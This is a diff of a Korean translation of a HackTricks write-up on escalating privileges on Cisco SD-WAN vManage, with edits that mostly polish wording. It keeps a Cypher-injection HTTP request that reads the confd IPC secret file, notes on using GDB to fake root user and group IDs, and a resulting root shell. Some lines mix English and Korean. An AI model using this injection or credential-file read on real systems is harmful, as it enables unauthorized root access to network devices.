@@ -19,13 +19,13 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 (Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-조금 조사한 후, `confd` 및 다양한 바이너리와 관련된 [문서](http://66.218.245.39/doc/html/rn03re18.html)를 통해, IPC 소켓을 인증하기 위해 `/etc/confd/confd_ipc_secret`에 위치한 비밀을 사용한다는 것을 발견했습니다:
+조금 조사한 후, `confd` 및 다양한 바이너리와 관련된 [문서](http://66.218.245.39/doc/html/rn03re18.html)를 통해 Cisco 웹사이트에서 계정으로 접근할 수 있는 것을 발견했습니다. IPC 소켓을 인증하기 위해 `/etc/confd/confd_ipc_secret`에 위치한 비밀을 사용합니다:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-우리의 Neo4j 인스턴스를 기억하나요? `vmanage` 사용자 권한으로 실행되고 있어, 이전 취약점을 사용하여 파일을 검색할 수 있습니다:
+우리의 Neo4j 인스턴스를 기억하나요? `vmanage` 사용자 권한으로 실행되고 있으므로 이전 취약점을 사용하여 파일을 검색할 수 있습니다:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -91,18 +91,18 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 ```
 When I run “ps aux”, I observed the following (_note -g 100 -u 107_)  
-“ps aux”를 실행했을 때 다음과 같은 내용을 관찰했습니다 (_note -g 100 -u 107_)
+“ps aux”를 실행했을 때, 다음과 같은 내용을 관찰했습니다 (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-I hypothesized the “confd\_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+I hypothesized the “confd\_cli” 프로그램이 로그인한 사용자로부터 수집한 사용자 ID와 그룹 ID를 “cmdptywrapper” 애플리케이션에 전달한다고 가정했습니다.
 
-내 첫 번째 시도는 “cmdptywrapper”를 직접 실행하고 `-g 0 -u 0`을 제공하는 것이었지만 실패했습니다. 어딘가에 파일 설명자(-i 1015)가 생성된 것 같고, 이를 위조할 수 없습니다.
+내 첫 번째 시도는 “cmdptywrapper”를 직접 실행하고 `-g 0 -u 0`을 제공하는 것이었지만 실패했습니다. 어딘가에서 파일 디스크립터(-i 1015)가 생성된 것 같고, 이를 위조할 수 없습니다.
 
-synacktiv의 블로그(마지막 예제)에서 언급했듯이, `confd_cli` 프로그램은 명령줄 인수를 지원하지 않지만, 디버거를 통해 영향을 줄 수 있으며, 다행히도 GDB가 시스템에 포함되어 있습니다.
+synacktiv의 블로그(마지막 예제)에서 언급했듯이, `confd_cli` 프로그램은 명령줄 인수를 지원하지 않지만, 디버거를 통해 영향을 줄 수 있으며, 다행히 GDB가 시스템에 포함되어 있습니다.
 
 저는 API `getuid`와 `getgid`가 0을 반환하도록 강제하는 GDB 스크립트를 만들었습니다. 이미 deserialization RCE를 통해 “vmanage” 권한을 가지고 있으므로, `/etc/confd/confd_ipc_secret`를 직접 읽을 수 있는 권한이 있습니다.
 
@@ -159,16 +159,16 @@ uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>HackTricks 지원하기</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
